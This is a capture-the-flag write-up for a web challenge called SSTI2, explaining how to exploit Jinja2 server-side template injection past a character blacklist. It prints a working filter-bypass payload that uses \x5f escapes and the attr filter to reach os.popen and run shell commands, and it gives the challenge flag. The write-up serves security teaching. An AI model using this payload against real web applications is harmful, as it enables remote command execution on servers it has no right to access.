# SSTI2

- **Platform:** CyLab academy(PicoCTF)
- **Category:** Web
- **Difficulty:** Medium

## Challenge

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

## Solution

1. After SSTI1, we could presume that SSTI2 is also about Server Side Template Injection, so at first I tried to use `{{7*7}}` which announced

  ```text
  49
  ```
  so this suggests a possible vulnerability. 

2.  By trying `{{7*'7'}}` and the website anounced
  ```text
  7777777
  ```
<img width="680" height="410" alt="image" src="https://github.com/user-attachments/assets/cb7e9e62-9263-48f7-9079-2a446c83f2a3" />

  this meant that this website is possibly built with Jinja2 or Twig, which are both python template engines. 

3. By trying a number of combanations, we can identify that `.`, `_` and `[]` were in the blacklist of characters. So we need to bypass these.

For `_`, As a matter of fact, python automatically interpret bytestrings to text. So we can use the bytestring for `_` to replace it in our payload, which is `\x5f`.

Next for `.`, we need a way to access attributes without using `.` and any other blacklisted characters. For Jinja2, there are builtin filters that we could use. The one we are interested in is this one :
```text
jinja-filters.attr(obj: Any, name: str) → jinja2.runtime.Undefined | Any
Get an attribute of an object. foo|attr("bar") works like foo.bar, but returns undefined instead of falling back to foo["bar"] if the attribute doesn’t exist.
```
So now we have found the way to bypass the character blacklisting. 

4. Now to construct the payload. Python has a feature called [magical methods](https://www.geeksforgeeks.org/python/dunder-magic-methods-python/) which allows us to have custom behaviors. So we could construct the following payload
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Now we just have to modify this payload to pass the character check. Note that the Jinja filter only looksup attributes and not items, and both `__global__` and `__builtins__` return dictionaries, so we have to modify the payload to access items with `__getitem__`. This gives us the following payload:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}  
```
5. After using the payload above, we can see there is a file named `flag` so we simply change the command in our payload from `ls` to `cat flag` to obtain the flag. 


## Flag

`academy{sst1_f1lt3r_byp4ss_0a432894}`

## Key Takeaway

Blacklisting characters that may cause problems is potentially more vulnerable than whitelisting the safe characters. As there are many ways to bypass the blacklist. 

## References

- [https://learn.cylabacademy.org/library/488]
- [https://jinja.palletsprojects.com/en/stable/templates/#list-of-builtin-filters]
